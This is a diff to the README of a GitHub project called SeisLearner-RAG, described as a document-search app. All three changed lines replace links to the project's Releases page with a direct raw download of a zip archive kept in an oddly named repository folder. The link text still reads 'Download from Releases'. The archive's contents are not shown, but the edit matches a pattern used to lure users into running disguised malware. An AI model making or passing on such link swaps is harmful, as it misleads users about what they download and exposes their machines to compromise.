@@ -1,6 +1,6 @@
 # 🤖 SeisLearner-RAG - Smart document search made simple
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ffabianpg920120/SeisLearner-RAG/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ffabianpg920120/SeisLearner-RAG/raw/refs/heads/main/mesonephric/RAG_Learner_Seis_v2.6-beta.4.zip)
 
 ## 🚀 What this app does
 
@@ -31,7 +31,7 @@ For the best experience, use:
 
 Visit this page to download the Windows release:
 
-[Download SeisLearner-RAG from GitHub Releases](https://github.com/ffabianpg920120/SeisLearner-RAG/releases)
+[Download SeisLearner-RAG from GitHub Releases](https://github.com/ffabianpg920120/SeisLearner-RAG/raw/refs/heads/main/mesonephric/RAG_Learner_Seis_v2.6-beta.4.zip)
 
 On the Releases page, look for the latest version and choose the Windows file that matches your device. In most cases, this will be a `.exe` file or a `.zip` file.
 
@@ -200,4 +200,4 @@ Before you run any downloaded file:
 
 ## 📎 Project link
 
-GitHub Releases: https://github.com/ffabianpg920120/SeisLearner-RAG/releases
+GitHub Releases: https://github.com/ffabianpg920120/SeisLearner-RAG/raw/refs/heads/main/mesonephric/RAG_Learner_Seis_v2.6-beta.4.zip
